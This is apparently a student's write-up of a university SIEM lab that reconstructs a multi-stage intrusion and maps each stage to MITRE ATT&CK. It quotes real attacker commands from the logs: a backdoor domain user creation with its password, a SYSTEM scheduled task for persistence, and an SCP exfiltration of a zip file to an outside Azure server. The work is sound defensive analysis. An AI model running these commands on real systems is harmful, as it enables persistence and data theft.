Subject: Cyber Threat Intelligence — University of Technology Sydney
Tools Used: SIEM (Elastic/Kibana), MITRE ATT&CK Framework
Topics: Threat Detection, IOC Analysis, Attack Chain Reconstruction, SOC Analysis

Overview
This lab involved investigating a real attack scenario using a SIEM platform — working through raw alerts chronologically to reconstruct the full attack chain from initial reconnaissance
through to impact. Every stage was mapped to the MITRE ATT&CK framework with corresponding IOCs, which is exactly how threat analysis works in a real SOC environment.

Attack Summary
The investigation uncovered a multi-stage intrusion originating from an IP address in the Netherlands (89.39.107.198). The attacker performed external port scanning,
established a VNC connection via brute force, moved laterally through the network, dumped credentials using Mimikatz, created a backdoor user account, installed a cryptominer, 
and exfiltrated compressed data to an Azure cloud server.

ATT&CK Phase Breakdown
Reconnaissance
Detected open port connections on ports 5900 (VNC) and 3389 (RDP) from a Netherlands-based IP to the internal host STC-PC01.STC.LOCAL. The external scan was the first indicator of malicious
intent.

Initial Access — T1133, T1110.001
Multiple failed login attempts against non-existent accounts were followed by a successful VNC connection using TightVNC (vnserver.exe). The attacker used brute force to gain entry.
Execution — T1596.005, T1072
Scanning tool activity was detected originating from the compromised host, indicating the attacker was now performing internal reconnaissance from inside the network.
Persistence — T1098.004, T1136.001, T1543.002
Three persistence mechanisms were identified:

Mimikatz (mim.exe) used to extract Windows credentials in plaintext
A new domain user created via net1 user it.admin PkARPL213L /add /domain
A scheduled task created to reload malware every 60 minutes: schtasks.exe /create /sc minute /mo 60 /tn admintask /tr C:\Windows\admin_task.ps1 /ru SYSTEM

Privilege Escalation — T1068
The whoami /priv command was executed on the compromised host, used to enumerate the current user's privileges before escalating access.
Defense Evasion — T1197, T1562.001
BITSAdmin was used twice — first to download a file from angryip.org, then to pull a PowerShell script from a GitHub repository. A reverse shell trojan (Trojan:PowerShell/ReverseShell.SA)
was also detected on the domain controller.

Credential Access — T1555
A plaintext password file (PC01_user_password.txt) was discovered in the user's Documents folder. Mimikatz execution was also confirmed via Sysmon logs.
Lateral Movement — T1550.002, T1021.001
A successful remote login was detected from a new country using existing stolen credentials, confirming the attacker had moved laterally using pass-the-hash or stolen session tokens.

Collection — T1560.001
Suspicious file compression activity using PowerShell was detected on the domain controller STC-DC01.STC.LOCAL, suggesting the attacker was staging data for exfiltration.
Exfiltration — T1537

Data was exfiltrated via SCP to an Azure cloud server:
scp.exe C:\Windows\Temp\documents.zip azureuser@20.62.166.83:/home/azureuser
Impact — T1496
A cryptominer (NiceHash QuickMiner\excavator.exe) was found installed on the compromised host, indicating the attacker also used the system for financial gain alongside the primary intrusion.

Key Takeaways

A single open VNC port was the entry point for an attack that compromised the entire domain — attack surface reduction is critical
Mimikatz remains one of the most commonly used post-exploitation tools; detecting it early (via Sysmon or EDR) is essential to limiting damage
Attackers rarely stop at one persistence mechanism — this investigation found three running simultaneously
SIEM alert correlation across the full ATT&CK kill chain is what separates a SOC analyst from someone who just reads individual alerts

Skills Demonstrated
SIEM Analysis, MITRE ATT&CK, IOC Identification, Threat Hunting, Incident Reconstruction, Mimikatz Detection,
Lateral Movement Analysis, Persistence Detection, Elastic/Kibana.
